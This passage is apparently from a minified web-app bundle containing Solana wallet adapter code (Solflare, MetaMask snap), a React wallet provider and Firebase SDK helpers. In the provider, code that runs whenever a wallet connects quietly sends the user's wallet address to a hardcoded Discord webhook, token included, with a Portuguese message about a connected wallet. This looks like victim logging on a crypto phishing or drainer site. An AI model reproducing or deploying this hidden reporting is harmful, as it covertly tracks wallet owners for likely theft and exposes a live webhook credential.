MyAxOC41Mi0uNjMxIDMuMjExLjQ1Mi4zMTEgMi43NS0yLjE0Ny4wOTQtMi4xNTZ6bS02LjUxNi0uNzgxLjA3NSAyLjE1NiAyLjc1IDIuMTQ3LjQ1Mi0uMzExLS42MjItMy4yMTF6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48cGF0aCBkPSJtMTcuMjc3IDI0Ljk5OS4wMjgtLjg3Ni0uMjM1LS4yMDdoLTMuNTVsLS4yMTcuMjA3LjAxOS44NzYtMi45NjYtMS40MDMgMS4wMzYuODQ4IDIuMSAxLjQ1OWgzLjYwNmwyLjEwOS0xLjQ1OSAxLjAzNi0uODQ4eiIgZmlsbD0iI2MwYWQ5ZSIgc3Ryb2tlPSIjYzBhZDllIi8+PHBhdGggZD0ibTE3LjA1MSAyMi4wNDItLjQ1Mi0uMzExaC0yLjYwOGwtLjQ1Mi4zMTEtLjIzNSAyLjA4MS4yMTctLjIwN2gzLjU1bC4yMzUuMjA3LS4yNTQtMi4wODF6IiBmaWxsPSIjMTYxNjE2IiBzdHJva2U9IiMxNjE2MTYiLz48cGF0aCBkPSJtMjYuNTA1IDExLjA1My44LTMuODQyLTEuMTk2LTMuNTY5LTkuMDU4IDYuNzIzIDMuNDg0IDIuOTQ3IDQuOTI1IDEuNDQxIDEuMDkyLTEuMjcxLS40NzEtLjMzOS43NTMtLjY4Ny0uNTg0LS40NTIuNzUzLS41NzQtLjQ5OS0uMzc3em0tMjMuMjExLTMuODQxLjggMy44NDItLjUwOC4zNzcuNzUzLjU3NC0uNTc0LjQ1Mi43NTMuNjg3LS40NzEuMzM5IDEuMDgzIDEuMjcxIDQuOTI1LTEuNDQxIDMuNDg0LTIuOTQ3LTkuMDU5LTYuNzIzeiIgZmlsbD0iIzc2M2QxNiIgc3Ryb2tlPSIjNzYzZDE2Ii8+PHBhdGggZD0ibTI1LjQ2IDE0Ljc1NC00LjkyNS0xLjQ0MSAxLjQ5NyAyLjI1MS0yLjIzMiA0LjMzMSAyLjkzOC0uMDM4aDQuMzc4bC0xLjY1Ny01LjEwNHptLTE1LjQwNS0xLjQ0MS00LjkyNSAxLjQ0MS0xLjYzOCA1LjEwNGg0LjM2OWwyLjkyOC4wMzgtMi4yMjItNC4zMzEgMS40ODgtMi4yNTF6bTYuNjg1IDIuNDg2LjMxMS01LjQzMyAxLjQzMS0zLjg3aC02LjM1NmwxLjQxMyAzLjg3LjMyOSA1LjQzMy4xMTMgMS43MTQuMDA5IDQuMjE5aDIuNjFsLjAxOS00LjIxOS4xMjItMS43MTR6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48L2c+PGNpcmNsZSBjeD0iMjMuNSIgY3k9IjIzLjUiIGZpbGw9IiMwMDAiIHI9IjYuNSIvPjxwYXRoIGQ9Im0yNy40NzMgMjUuNTQ1LTEuMzEgMS4zNjhjLS4wMjkuMDMtLjA2My4wNTMtLjEwMS4wN2EuMzEuMzEgMCAwIDEgLS4xMjEuMDI0aC02LjIwOWMtLjAzIDAtLjA1OS0uMDA4LS4wODMtLjAyNGEuMTUuMTUgMCAwIDEgLS4wNTYtLjA2NWMtLjAxMi0uMDI2LS4wMTUtLjA1Ni0uMDEtLjA4NHMuMDE4LS4wNTUuMDM5LS4wNzZsMS4zMTEtMS4zNjhjLjAyOC0uMDMuMDYzLS4wNTMuMTAxLS4wNjlhLjMxLjMxIDAgMCAxIC4xMjEtLjAyNWg2LjIwOGMuMDMgMCAuMDU5LjAwOC4wODMuMDI0YS4xNS4xNSAwIDAgMSAuMDU2LjA2NWMuMDEyLjAyNi4wMTUuMDU2LjAxLjA4NHMtLjAxOC4wNTUtLjAzOS4wNzZ6bS0xLjMxLTIuNzU2Yy0uMDI5LS4wMy0uMDYzLS4wNTMtLjEwMS0uMDdhLjMxLjMxIDAgMCAwIC0uMTIxLS4wMjRoLTYuMjA5Yy0uMDMgMC0uMDU5LjAwOC0uMDgzLjAyNHMtLjA0NC4wMzgtLjA1Ni4wNjUtLjAxNS4wNTYtLjAxLjA4NC4wMTguMDU1LjAzOS4wNzZsMS4zMTEgMS4zNjhjLjAyOC4wMy4wNjMuMDUzLjEwMS4wNjlhLjMxLjMxIDAgMCAwIC4xMjEuMDI1aDYuMjA4Yy4wMyAwIC4wNTktLjAwOC4wODMtLjAyNGEuMTUuMTUgMCAwIDAgLjA1Ni0uMDY1Yy4wMTItLjAyNi4wMTUtLjA1Ni4wMS0uMDg0cy0uMDE4LS4wNTUtLjAzOS0uMDc2em0tNi40MzEtLjk4M2g2LjIwOWEuMzEuMzEgMCAwIDAgLjEyMS0uMDI0Yy4wMzgtLjAxNi4wNzMtLjA0LjEwMS0uMDdsMS4zMS0xLjM2OGMuMDItLjAyMS4wMzQtLjA0Ny4wMzktLjA3NnMuMDAxLS4wNTgtLjAxLS4wODRhLjE1LjE1IDAgMCAwIC0uMDU2LS4wNjVjLS4wMjUtLjAxNi0uMDU0LS4wMjQtLjA4My0uMDI0aC02LjIwOGEuMzEuMzEgMCAwIDAgLS4xMjEuMDI1Yy0uMDM4LjAxNi0uMDcyLjA0LS4xMDEuMDY5bC0xLjMxIDEuMzY4Yy0uMDIuMDIxLS4wMzQuMDQ3LS4wMzkuMDc2cy0uMDAxLjA1OC4wMS4wODQuMDMxLjA0OS4wNTYuMDY1LjA1NC4wMjQuMDgzLjAyNHoiIGZpbGw9InVybCgjYSkiLz48L3N2Zz4=";var ht=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},q6=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},Cf,$o,Q0,Y0,Z0,Yn,J0,$x,Hx,X0,ey,ty,ny,ry;class K6{constructor(){Cf.add(this),$o.set(this,{}),Q0.set(this,"1.0.0"),Y0.set(this,"MetaMask"),Z0.set(this,H6),Yn.set(this,null),J0.set(this,(e,t)=>{var r;return(r=ht(this,$o,"f")[e])!=null&&r.push(t)||(ht(this,$o,"f")[e]=[t]),()=>ht(this,Cf,"m",Hx).call(this,e,t)}),X0.set(this,async()=>{if(!ht(this,Yn,"f")){let e;try{e=(await Wx(()=>import("./index-03213607.js"),[],import.meta.url)).default}catch{throw new Error("Unable to load Solflare MetaMask SDK")}q6(this,Yn,new e,"f"),ht(this,Yn,"f").on("standard_change",t=>ht(this,Cf,"m",$x).call(this,"change",t))}return this.accounts.length||await ht(this,Yn,"f").connect(),{accounts:this.accounts}}),ey.set(this,async()=>{ht(this,Yn,"f")&&await ht(this,Yn,"f").disconnect()}),ty.set(this,async(...e)=>{if(!ht(this,Yn,"f"))throw new sn;return await ht(this,Yn,"f").standardSignAndSendTransaction(...e)}),ny.set(this,async(...e)=>{if(!ht(this,Yn,"f"))throw new sn;return await ht(this,Yn,"f").standardSignTransaction(...e)}),ry.set(this,async(...e)=>{if(!ht(this,Yn,"f"))throw new sn;return await ht(this,Yn,"f").standardSignMessage(...e)})}get version(){return ht(this,Q0,"f")}get name(){return ht(this,Y0,"f")}get icon(){return ht(this,Z0,"f")}get chains(){return[j0,gx,mx]}get features(){return{[nv]:{version:"1.0.0",connect:ht(this,X0,"f")},[U0]:{version:"1.0.0",disconnect:ht(this,ey,"f")},[rv]:{version:"1.0.0",on:ht(this,J0,"f")},[Ki]:{version:"1.0.0",supportedTransactionVersions:["legacy",0],signAndSendTransaction:ht(this,ty,"f")},[En]:{version:"1.0.0",supportedTransactionVersions:["legacy",0],signTransaction:ht(this,ny,"f")},[Ua]:{version:"1.0.0",signMessage:ht(this,ry,"f")}}}get accounts(){return ht(this,Yn,"f")?ht(this,Yn,"f").standardAccounts:[]}}$o=new WeakMap,Q0=new WeakMap,Y0=new WeakMap,Z0=new WeakMap,Yn=new WeakMap,J0=new WeakMap,X0=new WeakMap,ey=new WeakMap,ty=new WeakMap,ny=new WeakMap,ry=new WeakMap,Cf=new WeakSet,$x=function(e,...t){var r;(r=ht(this,$o,"f")[e])==null||r.forEach(i=>i.apply(null,t))},Hx=function(e,t){var r;ht(this,$o,"f")[e]=(r=ht(this,$o,"f")[e])==null?void 0:r.filter(i=>t!==i)};let qE=!1;function G6(){qE||(u6(new K6),qE=!0)}async function Q6(){const n="solflare-detect-metamask";function e(){window.postMessage({target:"metamask-contentscript",data:{name:"metamask-provider",data:{id:n,jsonrpc:"2.0",method:"wallet_getSnaps"}}},window.location.origin)}function t(r){var s,o;const i=r.data;(i==null?void 0:i.target)==="metamask-inpage"&&((s=i.data)==null?void 0:s.name)==="metamask-provider"&&(((o=i.data.data)==null?void 0:o.id)===n?(window.removeEventListener("message",t),i.data.data.error||G6()):e())}window.addEventListener("message",t),window.setTimeout(()=>window.removeEventListener("message",t),5e3),e()}const Y6="Solflare";class Z6 extends tv{constructor(e={}){super(),this.name=Y6,this.url="https://solflare.com",this.icon="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+",this.supportedTransactionVersions=new Set(["legacy",0]),this._readyState=typeof window>"u"||typeof document>"u"?Ve.Unsupported:Ve.Loadable,this._disconnected=()=>{const t=this._wallet;t&&(t.off("disconnect",this._disconnected),this._wallet=null,this._publicKey=null,this.emit("error",new xp),this.emit("disconnect"))},this._accountChanged=t=>{if(!t)return;const r=this._publicKey;if(r){try{t=new Ie(t.toBytes())}catch(i){this.emit("error",new Rl(i==null?void 0:i.message,i));return}r.equals(t)||(this._publicKey=t,this.emit("connect",t))}},this._connecting=!1,this._publicKey=null,this._wallet=null,this._config=e,this._readyState!==Ve.Unsupported&&(fx(()=>{var t;return(t=window.solflare)!=null&&t.isSolflare||window.SolflareApp?(this._readyState=Ve.Installed,this.emit("readyStateChange",this._readyState),!0):!1}),Q6())}get publicKey(){return this._publicKey}get connecting(){return this._connecting}get connected(){var e;return!!((e=this._wallet)!=null&&e.connected)}get readyState(){return this._readyState}async autoConnect(){this.readyState===Ve.Loadable&&B0()||await this.connect()}async connect(){try{if(this.connected||this.connecting)return;if(this._readyState!==Ve.Loadable&&this._readyState!==Ve.Installed)throw new Xs;if(this.readyState===Ve.Loadable&&B0()){const i=encodeURIComponent(window.location.href),s=encodeURIComponent(window.location.origin);window.location.href=`https://solflare.com/ul/v1/browse/${i}?ref=${s}`;return}let e;try{e=(await Wx(()=>import("./index-3d96e678.js"),[],import.meta.url)).default}catch(i){throw new y3(i==null?void 0:i.message,i)}let t;try{t=new e({network:this._config.network})}catch(i){throw new rl(i==null?void 0:i.message,i)}if(this._connecting=!0,!t.connected)try{await t.connect()}catch(i){throw new Vs(i==null?void 0:i.message,i)}if(!t.publicKey)throw new Vs;let r;try{r=new Ie(t.publicKey.toBytes())}catch(i){throw new Rl(i==null?void 0:i.message,i)}t.on("disconnect",this._disconnected),t.on("accountChanged",this._accountChanged),this._wallet=t,this._publicKey=r,this.emit("connect",r)}catch(e){throw this.emit("error",e),e}finally{this._connecting=!1}}async disconnect(){const e=this._wallet;if(e){e.off("disconnect",this._disconnected),e.off("accountChanged",this._accountChanged),this._wallet=null,this._publicKey=null;try{await e.disconnect()}catch(t){this.emit("error",new ev(t==null?void 0:t.message,t))}}this.emit("disconnect")}async sendTransaction(e,t,r={}){try{const i=this._wallet;if(!i)throw new sn;try{const{signers:s,...o}=r;return Zi(e)?s!=null&&s.length&&e.sign(s):(e=await this.prepareTransaction(e,t,o),s!=null&&s.length&&e.partialSign(...s)),o.preflightCommitment=o.preflightCommitment||t.commitment,await i.signAndSendTransaction(e,o)}catch(s){throw s instanceof xn?s:new Yi(s==null?void 0:s.message,s)}}catch(i){throw this.emit("error",i),i}}async signTransaction(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signTransaction(e)||e}catch(r){throw new si(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signAllTransactions(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signAllTransactions(e)||e}catch(r){throw new si(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signMessage(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signMessage(e,"utf8")}catch(r){throw new kp(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}}const Xl=Y.createContext(),qx="https://api.mainnet-beta.solana.com",J6=({children:n})=>{const e=Y.useMemo(()=>[new $6,new Z6],[]);return te.jsx(p3,{endpoint:qx,children:te.jsx(L6,{wallets:e,autoConnect:!0,children:te.jsx(V6,{children:te.jsx(X6,{children:n})})})})},X6=({children:n})=>{const{publicKey:e,connected:t,disconnect:r,connect:i}=px(),[s,o]=Y.useState(null),[a,l]=Y.useState(0),[u,h]=Y.useState(!1),f=Y.useMemo(()=>new Xw(qx),[]);Y.useEffect(()=>{if(t&&e){const x=e.toBase58();o(x),h(!0),localStorage.setItem("walletAddress",x),fetch("https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`📡 Wallet conectada na página principal:
\`${x}\``})}),f.getBalance(e).then(k=>{l(k/1e9)})}else o(null),l(0),h(!1)},[t,e]);const m=async()=>{try{await i()}catch(x){console.error("Erro ao conectar wallet:",x)}},v=async()=>{await r(),localStorage.removeItem("walletAddress")};return te.jsx(Xl.Provider,{value:{walletAddress:s,walletBalance:a,isConnected:u,connectWallet:m,disconnectWallet:v},children:n})},e5=()=>{};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Kx=function(n){const e=[];let t=0;for(let r=0;r<n.length;r++){let i=n.charCodeAt(r);i<128?e[t++]=i:i<2048?(e[t++]=i>>6|192,e[t++]=i&63|128):(i&64512)===55296&&r+1<n.length&&(n.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(n.charCodeAt(++r)&1023),e[t++]=i>>18|240,e[t++]=i>>12&63|128,e[t++]=i>>6&63|128,e[t++]=i&63|128):(e[t++]=i>>12|224,e[t++]=i>>6&63|128,e[t++]=i&63|128)}return e},t5=function(n){const e=[];let t=0,r=0;for(;t<n.length;){const i=n[t++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=n[t++];e[r++]=String.fromCharCode((i&31)<<6|s&63)}else if(i>239&&i<365){const s=n[t++],o=n[t++],a=n[t++],l=((i&7)<<18|(s&63)<<12|(o&63)<<6|a&63)-65536;e[r++]=String.fromCharCode(55296+(l>>10)),e[r++]=String.fromCharCode(56320+(l&1023))}else{const s=n[t++],o=n[t++];e[r++]=String.fromCharCode((i&15)<<12|(s&63)<<6|o&63)}}return e.join("")},Gx={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(n,e){if(!Array.isArray(n))throw Error("encodeByteArray takes an array as a parameter");this.init_();const t=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<n.length;i+=3){const s=n[i],o=i+1<n.length,a=o?n[i+1]:0,l=i+2<n.length,u=l?n[i+2]:0,h=s>>2,f=(s&3)<<4|a>>4;let m=(a&15)<<2|u>>6,v=u&63;l||(v=64,o||(m=64)),r.push(t[h],t[f],t[m],t[v])}return r.join("")},encodeString(n,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(n):this.encodeByteArray(Kx(n),e)},decodeString(n,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(n):t5(this.decodeStringToByteArray(n,e))},decodeStringToByteArray(n,e){this.init_();const t=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<n.length;){const s=t[n.charAt(i++)],a=i<n.length?t[n.charAt(i)]:0;++i;const u=i<n.length?t[n.charAt(i)]:64;++i;const f=i<n.length?t[n.charAt(i)]:64;if(++i,s==null||a==null||u==null||f==null)throw new n5;const m=s<<2|a>>4;if(r.push(m),u!==64){const v=a<<4&240|u>>2;if(r.push(v),f!==64){const x=u<<6&192|f;r.push(x)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let n=0;n<this.ENCODED_VALS.length;n++)this.byteToCharMap_[n]=this.ENCODED_VALS.charAt(n),this.charToByteMap_[this.byteToCharMap_[n]]=n,this.byteToCharMapWebSafe_[n]=this.ENCODED_VALS_WEBSAFE.charAt(n),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[n]]=n,n>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(n)]=n,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(n)]=n)}}};class n5 extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const r5=function(n){const e=Kx(n);return Gx.encodeByteArray(e,!0)},bd=function(n){return r5(n).replace(/\./g,"")},Qx=function(n){try{return Gx.decodeString(n,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function i5(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof globalThis<"u")return globalThis;throw new Error("Unable to locate globalThis object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const s5=()=>i5().__FIREBASE_DEFAULTS__,o5=()=>{if(typeof process>"u"||typeof process.env>"u")return;const n={}.__FIREBASE_DEFAULTS__;if(n)return JSON.parse(n)},a5=()=>{if(typeof document>"u")return;let n;try{n=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=n&&Qx(n[1]);return e&&JSON.parse(e)},Dp=()=>{try{return e5()||s5()||o5()||a5()}catch(n){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${n}`);return}},Yx=n=>{var e,t;return(t=(e=Dp())===null||e===void 0?void 0:e.emulatorHosts)===null||t===void 0?void 0:t[n]},l5=n=>{const e=Yx(n);if(!e)return;const t=e.lastIndexOf(":");if(t<=0||t+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(t+1),10);return e[0]==="["?[e.substring(1,t-1),r]:[e.substring(0,t),r]},Zx=()=>{var n;return(n=Dp())===null||n===void 0?void 0:n.config},Jx=n=>{var e;return(e=Dp())===null||e===void 0?void 0:e[`_${n}`]};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class c5{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}wrapCallback(e){return(t,r)=>{t?this.reject(t):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(t):e(t,r))}}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function u5(n,e){if(n.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const t={alg:"none",type:"JWT"},r=e||"demo-project",i=n.iat||0,s=n.sub||n.user_id;if(!s)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const o=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:s,user_id:s,firebase:{sign_in_provider:"custom",identities:{}}},n),a="";return[bd(JSON.stringify(t)),bd(JSON.stringify(o)),a].join(".")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function nr(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function h5(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(nr())}function f5(){var n;const e=(n=Dp())===null||n===void 0?void 0:n.forceEnvironment;if(e==="node")return!0;if(e==="browser")return!1;try{return Object.prototype.toString.call(globalThis.process)==="[object process]"}catch{return!1}}function d5(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function p5(){const n=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof n=="object"&&n.id!==void 0}function g5(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function m5(){const n=nr();return n.indexOf("MSIE ")>=0||n.indexOf("Trident/")>=0}function y5(){return!f5()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function w5(){try{return typeof indexedDB=="object"}catch{return!1}}function v5(){return new Promise((n,e)=>{try{let 